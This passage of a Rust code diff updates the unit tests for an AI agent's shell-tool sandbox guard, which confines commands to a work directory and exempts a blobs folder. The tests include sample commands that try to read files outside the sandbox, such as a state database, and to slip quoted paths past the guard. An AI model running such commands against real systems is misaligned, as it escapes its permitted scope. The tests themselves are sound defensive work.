+            "blob payload path must not be rejected by the work-dir guard: {out:?}"
+        );
+        // Its siblings under `state/` stay out of reach.
+        let err = BashTool::for_test()
+            .execute(
+                json!({ "command": "cat /tmp/state/storage.db" }),
+                &ctx_with(None),
+            )
+            .await
+            .unwrap_err();
+        assert!(
+            matches!(err, ToolError::InvalidParams(_)),
+            "exempting blobs/ must not open the rest of state/: {err:?}"
         );
     }
 
@@ -4643,7 +5061,9 @@ mod tests {
     fn require_command_paths_within_work_dir_walks_subcommands() {
         let ws = Path::new("/tmp");
         let work = Path::new("/tmp/work");
-        let skills = WorkspacePaths::new("/tmp").persona_skills_dir("01JCUSTOM");
+        let paths = WorkspacePaths::new("/tmp");
+        let skills = paths.persona_skills_dir("01JCUSTOM");
+        let exempt = vec![skills.clone(), paths.blobs_dir()];
 
         // Clean command — no offending paths.
         assert!(
@@ -4651,7 +5071,7 @@ mod tests {
                 "ls /tmp/work && cat /etc/hosts",
                 ws,
                 work,
-                &skills
+                &exempt
             )
             .is_ok()
         );
@@ -4659,7 +5079,7 @@ mod tests {
         // Quoted path inside the workspace but outside work — caught
         // after `shell_words::split` unquotes the token.
         let err =
-            require_command_paths_within_work_dir(r#"ls "/tmp/profile/foo""#, ws, work, &skills)
+            require_command_paths_within_work_dir(r#"ls "/tmp/profile/foo""#, ws, work, &exempt)
                 .unwrap_err();
         assert!(matches!(err, ToolError::InvalidParams(ref m) if m.contains("/tmp/profile/foo")));
 
@@ -4668,7 +5088,7 @@ mod tests {
             "git status | tee /tmp/logs/out",
             ws,
             work,
-            &skills,
+            &exempt,
         )
         .unwrap_err();
         assert!(matches!(err, ToolError::InvalidParams(ref m) if m.contains("/tmp/logs/out")));
@@ -4682,7 +5102,7 @@ mod tests {
                 &format!("python {} auth-status", script.display()),
                 ws,
                 work,
-                &skills
+                &exempt
             )
             .is_ok()
         );
